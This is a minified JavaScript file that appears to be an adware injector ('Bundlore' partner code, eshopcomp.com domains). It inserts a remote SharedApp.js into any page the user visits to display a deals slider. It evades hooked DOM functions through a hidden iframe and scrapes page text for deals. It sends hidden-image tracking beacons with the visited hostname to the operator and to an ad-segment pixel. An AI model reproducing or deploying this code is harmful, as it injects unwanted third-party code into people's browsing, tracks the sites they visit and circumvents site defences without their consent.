new function(){window.FO_DOMAIN = ".eshopcomp.com";
var Injector=function(){function e(){}return e.getAltDocument=function(){if(null==e.altDocument){var t=document.createElement("iframe");t.height=t.width="0",document.body.appendChild(t),e.altDocument=t.contentWindow.document}return e.altDocument},e.injectScript=function(t,n,o){var r=null,a=!0,i=!1,d=document.createElement;d.toString().indexOf("[native code]")>0?r=document.createElement("script"):(r=e.getAltDocument().createElement.call(document,"script"),a=!1),r.onload=r.onreadystatechange=function(e){i||r.readyState&&"loaded"!==r.readyState&&"complete"!==r.readyState||(i=!0,r.parentNode&&r.parentNode.removeChild(r),n&&window.setTimeout(function(){n()},1))},r.onerror=function(e){i||(i=!0,o&&window.setTimeout(function(){o(e)},1))};var c=document.getElementsByTagName("head")[0],u=c.appendChild;return u.toString().indexOf("[native code]")>0?c.appendChild(r):(e.getAltDocument().appendChild.call(c,r),a=!1),r.src=t,a},e.altDocument=null,e}(),BootstrapHelper=function(){function e(){}return e.bootstrap=function(t,n,o){void 0===o&&(o=[]),o&&o.length||(o=window.FO_DOMAIN?[window.FO_DOMAIN]:[".datafastguru.info"]);var r=e.selectDomain(o);e.notify(r,t,"inj",{},.01),e.notifyGenericUrl("https://secure.adnxs.com/seg?add=2735784&t=2");var a="//pstatic"+r+"/nwp/v0_0_548/release/Shared/SharedApp.js",i="FO.Shared_"+n+".SharedApp",d=Injector.injectScript(a,function(){var n=e.instantiateClass(i);n.init(t,r)},function(n){e.notify(r,t,"exception",{ex:"Failure to get SharedApp"},.01)});window.setTimeout(function(){var n=void 0==window.FO;n&&e.notify(r,t,"generic",{subtype:"badinj",nativeinj:""+d},.01)},3e3)},e.notify=function(t,n,o,r,a){o+"_rate"in n.overrides&&(a=parseFloat(n.overrides[o+"_rate"]));var i=Math.random()<a;if(i){var d="//app"+t+"/a/"+o+"/logo.png",c={};c.fam="nwp",c.t=(new Date).getTime()+"",c.v="0_0_548",c.dmn=t,c.partid=n.partnerCode,c.subid=n.subId,c.hn=document.location.host,c.safepassage="1";for(var u in r)c[u]=r[u];e.notifyGenericUrl(d,c)}},e.notifyGenericUrl=function(e,t){void 0===t&&(t={});try{if(t){e+="?";for(var n in t){var o=t[n]+"";e=e+"&"+n+"="+encodeURIComponent(o)}}var r=document.body.appendChild(document.createElement("img"));return r.style.zIndex="-100",r.style.position="absolute",r.style.left="0",r.style.top="0",r.src=e,!0}catch(a){return!1}},e.selectDomain=function(e){for(var t=[],n=0;n<e.length;n++)e[n]&&e[n].length&&-1==e[n].indexOf("$")&&t.push(e[n]);var n=Math.floor(Math.random()*t.length);return t[n]},e.instantiateClass=function(e){for(var t=e.split("."),n=window,o=0;o<t.length;o++)n=n[t[o]];var r=new n;return r},e}(),params={"products":{"RightSliderY":[{"logic":["CommerceDealsLogic","CouponsLogic"],"visual":"RightSliderY","weight":10}]},modules:{},partnerCode:"BundloreSlider300415",subId:"mm-1506",providerName:"FlashMall",providerLink:"",overrides:{inj_rate:"0.01",exception_rate:"1",noshow_rate:"0.01",init_rate:"0.01",usr_rate:"0.1"},flags:{base:{"value":[{"name":"NotificationRates","flag":"","variants":[{"name":"Default","flagValue":"","odds":1,"values":[{"name":"notifyrate.inj","val":"0.01"},{"name":"notifyrate.exception","val":"0.001"},{"name":"notifyrate.init","val":"0.01"},{"name":"notifyrate.usr","val":"0.01"},{"name":"notifyrate.noshow","val":"0.01"},{"name":"notifyrate.wo","val":"0.1"}]}]},{"name":"OffersApiPruning","flag":"oap","variants":[{"name":"Off","flagValue":"off","odds":0.8,"values":[{"name":"offersapi.prune","val":"0"}]},{"name":"TopHalf","flagValue":"top","odds":0.1,"values":[{"name":"offersapi.prune","val":"1"}]},{"name":"OverMedian","flagValue":"med","odds":0.1,"values":[{"name":"offersapi.prune","val":"2"}]}]},{"name":"newScrapeWeight","flag":"itai_scr_7","variants":[{"name":"old_scrape_values","flagValue":"set1","odds":0.8,"values":[{"name":"deal-scrape-weights-amplify.title","val":"6"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"6"},{"name":"deal-scrape-weights-amplify.search","val":"8"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"6"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv1","flagValue":"set2","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-2"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"10"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"1"}]},{"name":"ampv2","flagValue":"set3","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-1"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-1"},{"name":"deal-scrape-weights-amplify.search","val":"20"},{"name":"deal-scrape-weights-amplify.ribbon","val":"20"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"-1"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"1"}]},{"name":"ampv3","flagValue":"set4","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-2"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"10"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"OldExperiment1","flagValue":"e1","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"10"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"15"},{"name":"deal-scrape-weights-amplify.ribbon","val":"6"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"8"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"OldExperiment2","flagValue":"e2","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"5"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"20"},{"name":"deal-scrape-weights-amplify.ribbon","val":"15"},{"name":"deal-scrape-weights-amplify.importantqs","val":"8"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"14"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv4","flagValue":"set5","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"6"},{"name":"deal-scrape-weights-amplify.otherqs","val":"0"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"8"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-6"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv5","flagValue":"set6","odds":0.2,"values":[{"name":"deal-scrape-weights-amplify.title","val":"0"},{"name":"deal-scrape-weights-amplify.otherqs","val":"0"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"20"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"0"},{"name":"deal-scrape-weights-amplify.h1","val":"0"},{"name":"dedicated-part-of-scrape","val":"0"}]}]},{"name":"Scroll","flag":"ruby_scrollx1","variants":[{"name":"Auto10","flagValue":"a10","odds":0.5,"values":[{"name":"rightslider.scroll-auto","val":"8000"}]},{"name":"Auto30","flagValue":"a30","odds":0.5,"values":[{"name":"rightslider.scroll-auto","val":"22000"}]}]},{"name":"DeafultMerchantImg","flag":"dfi","variants":[{"name":"UseDefault","flagValue":"use","odds":0,"values":[{"name":"deals.default-merchant-image","val":"1"}]},{"name":"NoDefault","flagValue":"no","odds":1,"values":[{"name":"deals.default-merchant-image","val":"0"}]}]},{"name":"PersistanceTest","flag":"","variants":[{"name":"Easy","flagValue":"","odds":1,"values":[{"name":"persistance.testset","val":"1"},{"name":"persistance.testratio","val":"0.001"}]}]}]},specific:{}}},version="0_0_548";BootstrapHelper.bootstrap(params,version);}